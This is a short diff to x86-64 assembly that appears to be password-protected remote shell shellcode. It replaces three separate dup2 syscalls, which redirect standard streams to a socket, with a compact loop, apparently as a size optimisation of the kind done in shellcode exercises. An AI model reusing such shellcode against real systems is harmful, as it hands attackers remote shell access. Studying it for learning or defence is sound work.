@@ -64,18 +64,16 @@ dup2:
     ; dup2(sock, 1);
     ; dup2(sock, 2);
     ; __NR_dup2 = 33
+    ; On success, return the new file descriptor
 
-    mov rax, 33
-    xor rsi, rsi
-    syscall
+    push 2
+    pop rsi
 
-    mov rax, 33
-    inc rsi
+dup2_loop:
+    mov al, 33
     syscall
-
-    mov rax, 33
-    inc rsi
-    syscall
+    dec esi
+    jns dup2_loop
 
 read_password:
     ; read(int fd, void *buf, size_t count)
